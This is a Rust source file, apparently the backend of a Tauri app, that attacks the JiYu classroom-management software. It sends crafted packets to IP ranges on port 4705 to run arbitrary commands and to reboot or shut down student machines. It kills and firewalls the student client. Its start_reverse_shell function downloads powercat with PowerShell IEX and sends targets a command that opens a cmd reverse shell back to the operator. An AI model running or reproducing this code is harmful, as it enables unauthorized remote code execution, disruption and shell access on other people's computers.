use crate::jiyu::packets::{
    build_cmd_packet, build_msg_packet, build_reboot_packet, build_shutdown_packet, CommandResult,
};
use crate::jiyu::network::{
    find_student_ports, get_local_ip, parse_ip_range, send_packets_to_targets,
};
use serde_json::json;
use std::process::Command;

#[tauri::command]
pub fn send_message(
    ip: String,
    port: Option<u16>,
    message: String,
    loop_count: Option<u32>,
    interval: Option<u64>,
) -> CommandResult {
    let port = port.unwrap_or(4705);
    let loop_count = loop_count.unwrap_or(1);
    let interval = interval.unwrap_or(22);

    let ips = match parse_ip_range(&ip) {
        Ok(ips) => ips,
        Err(e) => return CommandResult::error(&e),
    };

    let packet = build_msg_packet(&message);
    let packets = vec![packet];

    match send_packets_to_targets(&ips, port, &packets, loop_count, interval) {
        Ok(msg) => CommandResult::success(&msg),
        Err(e) => CommandResult::error(&e),
    }
}

#[tauri::command]
pub fn execute_command(
    ip: String,
    port: Option<u16>,
    command: String,
    loop_count: Option<u32>,
    interval: Option<u64>,
) -> CommandResult {
    let port = port.unwrap_or(4705);
    let loop_count = loop_count.unwrap_or(1);
    let interval = interval.unwrap_or(22);

    let ips = match parse_ip_range(&ip) {
        Ok(ips) => ips,
        Err(e) => return CommandResult::error(&e),
    };

    let packet = build_cmd_packet(&command);
    let packets = vec![packet];

    match send_packets_to_targets(&ips, port, &packets, loop_count, interval) {
        Ok(msg) => CommandResult::success(&msg),
        Err(e) => CommandResult::error(&e),
    }
}

#[tauri::command]
pub fn reboot_target(
    ip: String,
    port: Option<u16>,
    loop_count: Option<u32>,
    interval: Option<u64>,
) -> CommandResult {
    let port = port.unwrap_or(4705);
    let loop_count = loop_count.unwrap_or(1);
    let interval = interval.unwrap_or(22);

    let ips = match parse_ip_range(&ip) {
        Ok(ips) => ips,
        Err(e) => return CommandResult::error(&e),
    };

    let packet = build_reboot_packet();
    let packets = vec![packet];

    match send_packets_to_targets(&ips, port, &packets, loop_count, interval) {
        Ok(msg) => CommandResult::success(&msg),
        Err(e) => CommandResult::error(&e),
    }
}

#[tauri::command]
pub fn shutdown_target(
    ip: String,
    port: Option<u16>,
    loop_count: Option<u32>,
    interval: Option<u64>,
) -> CommandResult {
    let port = port.unwrap_or(4705);
    let loop_count = loop_count.unwrap_or(1);
    let interval = interval.unwrap_or(22);

    let ips = match parse_ip_range(&ip) {
        Ok(ips) => ips,
        Err(e) => return CommandResult::error(&e),
    };

    let packet = build_shutdown_packet();
    let packets = vec![packet];

    match send_packets_to_targets(&ips, port, &packets, loop_count, interval) {
        Ok(msg) => CommandResult::success(&msg),
        Err(e) => CommandResult::error(&e),
    }
}

#[tauri::command]
pub fn get_local_info() -> CommandResult {
    let ip = match get_local_ip() {
        Ok(ip) => ip,
        Err(e) => return CommandResult::error(&e),
    };

    let ports = match find_student_ports() {
        Ok(ports) => ports,
        Err(_) => vec![],
    };

    CommandResult::success_with_data(
        "已获取本机信息",
        json!({
            "ip": ip,
            "ports": ports
        }),
    )
}

#[tauri::command]
#[cfg(target_os = "windows")]
pub fn break_screen_control() -> CommandResult {
    let commands = [
        ("sc", vec!["config", "MpsSvc", "start=", "auto"]),
        ("net", vec!["start", "MpsSvc"]),
        (
            "netsh",
            vec!["advfirewall", "set", "allprofiles", "state", "on"],
        ),
        (
            "netsh",
            vec![
                "advfirewall",
                "firewall",
                "set",
                "rule",
                "name=\"StudentMain.exe\"",
                "new",
                "action=block",
            ],
        ),
    ];

    for (cmd, args) in commands {
        let result = Command::new(cmd).args(&args).output();
        if let Err(e) = result {
            return CommandResult::error(&format!("执行 {} 失败: {}", cmd, e));
        }
    }

    CommandResult::success("屏幕控制已阻断")
}

#[tauri::command]
#[cfg(not(target_os = "windows"))]
pub fn break_screen_control() -> CommandResult {
    CommandResult::error("此功能仅支持Windows")
}

#[tauri::command]
#[cfg(target_os = "windows")]
pub fn continue_screen_control() -> CommandResult {
    let result = Command::new("netsh")
        .args(&[
            "advfirewall",
            "firewall",
            "set",
            "rule",
            "name=\"StudentMain.exe\"",
            "new",
            "action=allow",
        ])
        .output();

    match result {
        Ok(_) => CommandResult::success("屏幕控制已恢复"),
        Err(e) => CommandResult::error(&format!("恢复屏幕控制失败: {}", e)),
    }
}

#[tauri::command]
#[cfg(not(target_os = "windows"))]
pub fn continue_screen_control() -> CommandResult {
    CommandResult::error("此功能仅支持Windows")
}

#[tauri::command]
pub fn parse_ip(ip: String) -> CommandResult {
    match parse_ip_range(&ip) {
        Ok(ips) => CommandResult::success_with_data(
            &format!("已解析 {} 个IP地址", ips.len()),
            json!({ "ips": ips }),
        ),
        Err(e) => CommandResult::error(&e),
    }
}

#[tauri::command]
#[cfg(target_os = "windows")]
pub fn kill_student_process() -> CommandResult {
    let processes = ["StudentMain.exe", "Student.exe"];
    let mut killed = Vec::new();

    for process in processes {
        let output = Command::new("taskkill")
            .args(&["/F", "/IM", process])
            .output();

        if let Ok(output) = output {
            let stdout = String::from_utf8_lossy(&output.stdout);
            if stdout.contains("SUCCESS") || stdout.contains("terminated") {
                killed.push(process);
            }
        }
    }

    if killed.is_empty() {
        CommandResult::error("未找到学生端进程或终止失败")
    } else {
        CommandResult::success(&format!("已终止: {}", killed.join(", ")))
    }
}

#[tauri::command]
#[cfg(not(target_os = "windows"))]
pub fn kill_student_process() -> CommandResult {
    CommandResult::error("此功能仅支持Windows")
}

#[tauri::command]
#[cfg(target_os = "windows")]
pub fn start_reverse_shell(ip: String, port: Option<u16>) -> CommandResult {
    let port = port.unwrap_or(4705);
    let local_ip = match get_local_ip() {
        Ok(ip) => ip,
        Err(e) => return CommandResult::error(&e),
    };

    let listen_port: u16 = rand::random::<u16>() % 10000 + 50000;

    let listener_cmd = format!(
        "powershell -NoProfile -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -l -p {}\"",
        listen_port
    );

    match Command::new("cmd")
        .args(&["/C", "start", "powershell", "-NoExit", "-Command", &listener_cmd])
        .spawn()
    {
        Ok(_) => {}
        Err(e) => return CommandResult::error(&format!("启动监听窗口失败: {}", e)),
    }

    let cmd = format!(
        "powershell -NoProfile -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c {} -p {} -e cmd\"",
        local_ip, listen_port
    );

    let packet = build_cmd_packet(&cmd);
    let packets = vec![packet];
    let ips = match parse_ip_range(&ip) {
        Ok(ips) => ips,
        Err(e) => return CommandResult::error(&e),
    };

    match send_packets_to_targets(&ips, port, &packets, 1, 0) {
        Ok(_) => CommandResult::success(&format!("反弹Shell已启动，监听端口: {}", listen_port)),
        Err(e) => CommandResult::error(&e),
    }
}

#[tauri::command]
#[cfg(not(target_os = "windows"))]
pub fn start_reverse_shell(_ip: String, _port: Option<u16>) -> CommandResult {
    CommandResult::error("此功能仅支持Windows")
}
